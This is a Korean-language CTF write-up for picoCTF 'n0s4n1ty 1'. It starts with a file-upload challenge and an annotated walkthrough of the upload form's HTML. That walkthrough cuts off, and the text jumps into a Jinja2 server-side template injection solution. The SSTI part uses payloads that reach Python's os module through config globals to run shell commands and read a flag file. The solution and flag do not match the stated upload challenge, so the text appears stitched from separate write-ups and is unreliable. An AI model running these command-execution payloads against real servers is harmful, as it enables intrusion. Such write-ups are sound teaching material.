# Challenge: picoCTF - n0s4n1ty 1

## 문제 설명 & 접근
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.
* 문제 설명으로 보면, 파일 업로드 취약점으로 예상된다.
* Hints에서도 File upload was not sanitzed라 나와있다.

## 필요한 개념
#### 템플릿 랜더링
1. 사용자 입력이 템플릿 엔진으로 처리될 때, 적절한 검증이 없어 악의적인 입력이 서버에서 실행될 수 있는 취약점
2. 주로 python (jinja2), PHP (Twig), Java(FreeMarker)와 같은 서버에서 템플릿 랜더링 쓰는 환경에서 발생
3. 참고로 CTF 대부분은 Python Flask 기반 웹앱을 사용하며 Flask는 기본 템플릿 엔진으로 jinja2를 사용한다.

#### 내부 객체 접근
jinja2에서 공격자가 접근 가능한 템플릿 상수 객체에 config, self, request 등이 있다.
1. `config` : 현재 환경의 config 객체
2. `config.__class__` : config 객체의 클래스 (Flask Config class)
3. `config.__class__.__init__` : 클래스 생성자 함수
4. `config.__class__.__init__.globals__` : 생성자의 전역변수 딕셔너리
* `__globals__`라는 속성은 python에서 클래스나 객체에는 없고, 함수 객체에 존재한다. 보통 init의 전역공간에 os, sys, builtins 등의 모듈이 올라와있으니 이걸 활용하면 그 함수가 이미 import한 걸 재활용 가능(아래 내용 참고)
* 일반적으로 템플릿은 샌드박스 환경이기에 import는 할 수 없다. 그래서 위와 같은 간접적인 방식을 사용하는 것

#### 파이썬에서의 import
1. python에서 어떤 함수나 클래스가 정의될 때 그 함수가 포함된 파일의 가장 상단에 import된 모듈은 그 함수의 global namespace에 들어간다. 
    ```python
    # config.py
    import os

    class Config:
        def __init__(self):
            self.secret = os.getenv("SECRET")  # os 사용함
    ```
위 코드에서 init 함수는 정의할 때 os를 쓸 수 있었다. 따라서 `config.__init__.__globals.__['os']`라 쓰면 os 모듈 객체를 그대로 쓸 수 있다.

## 문제 분석
1.학습 겸, 보안과 관련이 떨어지더라도 코드를 뜯어보자. head 부분
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>No Sanity : upload the profile picture</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>...</style>
  </head>
</html>
```
* Tailwind CSS 프레임워크를 외부 CDN에서 불러온다. 이 웹사이트는 tailwind로 스타일링

2. body 부분 중 <div class="flex items-center justify ~~">
```html
<body>
  <div class="flex items-center justify-center min-h-screen bg-gray-100">
    <form action="upload.php" method="post" enctype="multipart/form-data" class="p-6 bg-white rounded-lg shadow-md">
      
      <div class="flex items-center space-x-6">
        
        <!-- 프로필 이미지 미리보기 -->
        <div class="shrink-0">
          <img 
            id="preview_img" 
            class="h-16 w-16 object-cover rounded-full"
                src="https://lh3.googleusercontent.com/a-/AFdZucpC6WFBlfaAbPHBwGM9z8SxyM1oV4wB4Ngwp_UyQ=s96-c" 
            alt="Current profile photo"
          >
        </div>
        
        <!-- 파일 업로드 필드 -->
        <label class="block">
          <span class="sr-only">Choose profile photo</span>
          <input 
            type="file" 
            onchange="loadFile(event)" 
            class="block w-full text-sm text-slate-500
                   file:mr-4 file:py-2 file:px-4
                   file:rounded-full file:border-0
                   file:text-sm file:font-semibold
                   file:bg-violet-50 file:text-violet-700
                   hover:file:bg-violet-100"
            name="fileToUpload" 
            id="fileToUpload"
          >
        </label>
      </div>

      <!-- 제출 버튼 -->
      <button 
        type="submit" 
        value="Upload File" 
        name="submit" 
        class="mt-4 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-700"
      >
        Upload Profile
      </button>
    </form>
  </div>

```
* div 전체 레이아웃 컨테이너에서 flex:flexbox 레이아웃 사용, items-center justify center:수직/수평 중앙 정렬, min-h-screen:화면 높이 100%, bg-gray-100:배경을 밝힌 흰색으로 설정
* 업로드 폼 등장
    * action="upload.php" : 사용자가 이 폼을 제출하면 unload.php라는 서버파일로 요청이 전송. 여기서 확장자, 콘텐츠, 경로 등을 검증하지 않으면 웹쉘 공격이 가능
    * method="post" : HTTP POST 방식 사용
    * enctype="multipart/form-data" : 파일을 포함한 폼 데이터를 서버를 보낼 때 반드시 필요한 속성. 실제 파일이 서버에 도달하니 공격자가 .php 파일을 업로드할 수 있다면 심각한 위협이 된다.
    * class="p-6 bg-white rounded-lg shadow-md" : padding, 배경색은 흰색, 모서리 둥글게, 그림자 효과
* 프로필 이미지 미리보기
    * `<div class="shrink-0">`:고정된 크기 유지하기 위한 tailwind 클래스
    * 프로필 이미지 표시. 
* 파일 업로드 필드
    * `<label class="block">`: HTML5 접근성 준수를 위한 래퍼 역할
    * `<span class="sr-only">Choose profile photo</span>` : sr-only는 시각적으로는 보이지 않아도 스크린리더에게는 읽히는 텍스트로, 접근성을 위한 코드이다.
    * 파일 선택 input 태그 (중요)
        * type="file" : 파일 선택창 뜨게 한다.
        * onchange="loadFile(event) : JS 함수 호출하는데, 이미지 미리보기 추정
        * class="" : 스타일 지정
        * name="fileToUpload":폼 제출 시 서버에서 이 이름으로 참조
        * id="fileToUpload" : JS에서 조작할 때 사용 가능
* 업로드 버튼
    * type="submit":클릭 시 폼 전송
    * value="Upload File":이 값도 서버로 전송
    * name="submit" : 서버에서 이 값을 통해 제출여부 판별 가능
    * class="" : 스타일



3. body 부분 중 `<script>`부분
```javascript
var loadFile = function(event) {
    var input = event.target;
    var file = input.files[0];
    var type = file.type;
    var output = document.getElementById('preview_img');

    output.src = URL.createObjectURL(event.target.files[0]);
    output.onload = function() {
        URL.revokeObjectURL(output.src); // free memory
    };
};
```
* var loadFile=function(event)로 함수 정의
    * 위 파일 업로드 필드에서 `<input type="file" onchange="loadFile(event)">` 형태로 호출된다. 매개변수 event는 브라우저에서 발생한 이벤트 객체
    * var input = event.target : 이벤트가 발생하면 HTML 요소 자체를 가져온다. 이 경우는 input 태그 `<input type="file">`을 의미
    * var file = input.file[0] : 사용자가 업로드한 첫번째 파일 객체

<class 'flask.config.Config'> 

3.`{{config.__class__.__init__.__globals__}}`를 입력하면, 전역변수가 쭉 출력된다.
4.`{{config.__class__.__init__.__globals__['os']}}`를 입력하면 dict의 value가 다음과 같이 나온다. 
<module 'os' from '/usr/lib/python3.8/os.py'>

5.`{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}`로 현재 디렉터리 확인 가능. /challenge라 뜬다. os.popen()은 python에서 리눅스 명령어를 실행하고, 그 출력 결과를 python에서 읽어오는 함수

6.`{{config.__class__.__init__.__globals__['os'].popen('ls -al').read()}}`로 디렉터리 내 파일을 보면 flag라는 이름을 가진 파일이 있다. 



## ✅ 풀이

```python
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```
결과
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}
